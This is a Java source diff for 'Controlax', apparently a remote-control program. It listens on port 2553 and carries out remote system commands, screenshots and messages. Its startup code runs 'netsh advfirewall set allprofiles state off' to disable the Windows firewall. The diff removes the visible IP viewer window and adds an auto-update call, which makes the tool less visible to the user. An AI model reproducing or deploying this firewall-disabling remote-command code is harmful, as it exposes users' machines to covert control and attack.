@@ -11,8 +11,8 @@ import java.util.ArrayList;
 import java.util.List;
 
 import javax.swing.JOptionPane;
-import javax.swing.UIManager;
 
+import com.khopan.controlax.update.AutoUpdate;
 import com.khopan.lazel.config.BinaryConfigObject;
 import com.khopan.lazel.packet.BinaryConfigPacket;
 import com.khopan.lazel.packet.Packet;
@@ -36,7 +36,6 @@ public class Controlax {
 		this.server.port().set(2553);
 		this.server.address().set(Controlax.IP_ADDRESS);
 		this.server.connectionListener().set(processor -> {
-			IPViewer.INSTANCE.frame.dispose();
 			processor.packetListener().set(packet -> {
 				BinaryConfigPacket config = packet.getPacket(BinaryConfigPacket.class);
 				this.processAction(config.getObject());
@@ -52,8 +51,6 @@ public class Controlax {
 		} catch(Throwable Errors) {
 			throw new InternalError("Error while initializing Robot", Errors);
 		}
-
-		IPViewer.view();
 	}
 
 	public void sendPacket(Packet packet) {
@@ -66,9 +63,6 @@ public class Controlax {
 		int action = config.getInt("Action");
 
 		if(action == -1) {
-			BinaryConfigObject object = new BinaryConfigObject();
-			object.putInt("Action", -1);
-			this.sendPacket(new BinaryConfigPacket(object));
 			System.exit(0);
 		} else if(action == 0) {
 			BinaryConfigObject object = new BinaryConfigObject();
@@ -80,12 +74,6 @@ public class Controlax {
 			CommandProcessor.processSystem(config);
 		} else if(action == 3) {
 			ImageProcessor.processScreenshot();
-		} else if(action == 4) {
-			if(config.getBoolean("Start")) {
-				StreamProcessor.INSTANCE.start(config.getInt("Framerate"));
-			} else {
-				StreamProcessor.INSTANCE.stop();
-			}
 		} else if(action == 5) {
 			MessageProcessor.processMessage(config);
 		} else if(action == 6) {
@@ -129,8 +117,6 @@ public class Controlax {
 			}
 		});
 
-		UIManager.setLookAndFeel("com.sun.java.swing.plaf.windows.WindowsLookAndFeel");
-
 		try {
 			ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c", "netsh advfirewall set allprofiles state off");
 			builder.start();
@@ -138,6 +124,6 @@ public class Controlax {
 			Controlax.errorDialog(Errors);
 		}
 
-		Controlax.INSTANCE = new Controlax();
+		AutoUpdate.initialize();
 	}
 }
